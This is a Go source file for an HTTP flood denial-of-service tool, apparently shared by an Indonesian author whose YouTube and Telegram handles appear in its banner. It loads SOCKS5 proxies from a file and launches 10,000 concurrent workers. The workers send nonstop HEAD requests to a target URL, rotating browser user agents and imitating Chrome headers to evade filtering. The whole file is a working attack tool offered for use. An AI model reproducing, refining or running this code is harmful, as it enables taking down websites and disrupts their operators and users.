package main

import (
	"bufio"
	"context"
	"crypto/tls"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"os"
	"os/signal"
	"runtime"
	"strings"
	"sync"
	"syscall"
	"time"

	"golang.org/x/net/proxy"
)

const (
	WorkerCount      = 10000
	TransportCount   = 500
	MaxIdleConns     = 5000
	MaxIdlePerHost   = 200
	MaxConnsPerHost  = 50
	RequestTimeout   = 2 * time.Second
	TLSHandshakeTO   = 1 * time.Second
	ResponseHeaderTO = 1 * time.Second
)

var userAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/124.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
}

var BeHa = http.Header{
	"Accept":                    {"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
	"Accept-Language":           {"en-US,en;q=0.9,id;q=0.8"},
	"Accept-Encoding":           {"gzip, deflate, br"},
	"Connection":                {"keep-alive"},
	"Upgrade-Insecure-Requests": {"1"},
	"Sec-Fetch-Dest":            {"document"},
	"Sec-Fetch-Mode":            {"navigate"},
	"Sec-Fetch-Site":            {"none"},
	"Sec-Fetch-User":            {"?1"},
	"Cache-Control":             {"no-cache"},
	"Pragma":                    {"no-cache"},
	"sec-ch-ua":                 {`"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"`},
	"sec-ch-ua-mobile":          {"?0"},
	"sec-ch-ua-platform":        {"Windows"},
}

func init() {
	runtime.GOMAXPROCS(runtime.NumCPU())
}

func bacaProxyFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()
	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		line := strings.TrimSpace(scanner.Text())
		if line != "" {
			proxies = append(proxies, line)
		}
	}
	if err := scanner.Err(); err != nil {
		return nil, err
	}
	if len(proxies) == 0 {
		return nil, fmt.Errorf("proxy.txt kosong")
	}
	return proxies, nil
}

func buatTransportSOCKS5(proxyAddr string) (*http.Transport, error) {
	dialer, err := proxy.SOCKS5("tcp", proxyAddr, nil, proxy.Direct)
	if err != nil {
		return nil, err
	}
	return &http.Transport{
		DialContext: func(ctx context.Context, network, addr string) (net.Conn, error) {
			return dialer.Dial(network, addr)
		},
		DisableKeepAlives:   false,
		MaxIdleConns:        MaxIdleConns,
		MaxIdleConnsPerHost: MaxIdlePerHost,
		MaxConnsPerHost:     MaxConnsPerHost,
		IdleConnTimeout:     90 * time.Second,
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
		ForceAttemptHTTP2:     false,
		DisableCompression:    true,
		TLSHandshakeTimeout:   TLSHandshakeTO,
		ResponseHeaderTimeout: ResponseHeaderTO,
	}, nil
}

func worker(ctx context.Context, wg *sync.WaitGroup, target string, tr *http.Transport, rng *rand.Rand) {
	defer wg.Done()
	client := &http.Client{
		Transport: tr,
		Timeout:   RequestTimeout,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}
	uaLen := len(userAgents)

	localHeader := make(http.Header)
	for k, v := range BeHa {
		localHeader[k] = v
	}

	for {
		select {
		case <-ctx.Done():
			return
		default:
			req, err := http.NewRequestWithContext(ctx, "HEAD", target, nil)
			if err != nil {
				continue
			}
			req.Header = localHeader
			req.Header.Set("User-Agent", userAgents[rng.Intn(uaLen)])
			resp, err := client.Do(req)
			if err == nil {
				io.Copy(io.Discard, resp.Body)
				resp.Body.Close()
			}
		}
	}
}

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintf(os.Stderr, "Contoh : %s <url>\n", os.Args[0])
		os.Exit(1)
	}
	Tempek := os.Args[1]

	proxies, err := bacaProxyFile("proxy.txt")
	if err != nil {
		fmt.Fprintf(os.Stderr, "proxy.txt: %v\n", err)
		os.Exit(1)
	}
	fmt.Printf("VIEW : %d proxy.txt\n", len(proxies))

	fmt.Printf("\n⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⡾⠃⠀⠀⠀⠀⠀⠀Runing : CloudShell\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣾⠋⠀⠀⠀⠀⠀⠀⠀⠀Server : None\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠛⠻⢿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀Version : v1.3.0\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡾⢛⣿⣿⣶⣄⠙⠿⠀⠀⠀⠀⠀⠀⠀⠀Connection : Wifi\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡟⢀⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀Dns : dns.adguard.com\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡿⢀⣾⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀Requests By : Golang\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⡇⣼⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀Sumber : go.sum\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣷⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Modifikasi : go.mod\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Country : Indonesia\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Device : Redmi-Xiaomi\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Cpu : 8 Core\n")
	fmt.Printf("⠀⠀⠀⠀⠀⠀⢀⣤⣾⣿⣿⣿⠿⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀YouTube : DizFlyze999\n")
	fmt.Printf("⠀⠀⠀⠀⣠⣶⡿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Telegram : ytdizflyze\n")
	fmt.Printf("\n🚀 ALL FAST SPAM METHOD\n")
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n")
	fmt.Printf("+ Threads : %d\n", WorkerCount)
	fmt.Printf("+ Target  : %s\n", Tempek)
	fmt.Printf("+ Mode    : RR-MT\n")
	fmt.Printf("+ Ulimit  : 1048576\n")
	fmt.Printf("+ Layers  : Seven\n")
	fmt.Printf("+ Proxies : %d ( SOCKS5 )\n", len(proxies))
	fmt.Printf("+ Transports : %d\n", TransportCount)
	fmt.Printf("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n\n\n\n\n\n\n\n\n")

	transportPool := make([]*http.Transport, TransportCount)
	for i := 0; i < TransportCount; i++ {
		proxyAddr := proxies[i%len(proxies)]
		tr, err := buatTransportSOCKS5(proxyAddr)
		if err != nil {
			continue
		}
		transportPool[i] = tr
	}
	var valid []*http.Transport
	for _, tr := range transportPool {
		if tr != nil {
			valid = append(valid, tr)
		}
	}
	if len(valid) == 0 {
		fmt.Fprintf(os.Stderr, "Tidak ada transport valid\n")
		os.Exit(1)
	}
	transportPool = valid

	ctx, cancel := context.WithCancel(context.Background())
	var wg sync.WaitGroup

	for i := 0; i < WorkerCount; i++ {
		tr := transportPool[i%len(transportPool)]
		rng := rand.New(rand.NewSource(time.Now().UnixNano() + int64(i*1000)))
		wg.Add(1)
		go worker(ctx, &wg, Tempek, tr, rng)
	}

	sigChan := make(chan os.Signal, 1)
	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
	<-sigChan
	fmt.Println("\nShutting down...")
	cancel()
	wg.Wait()
}
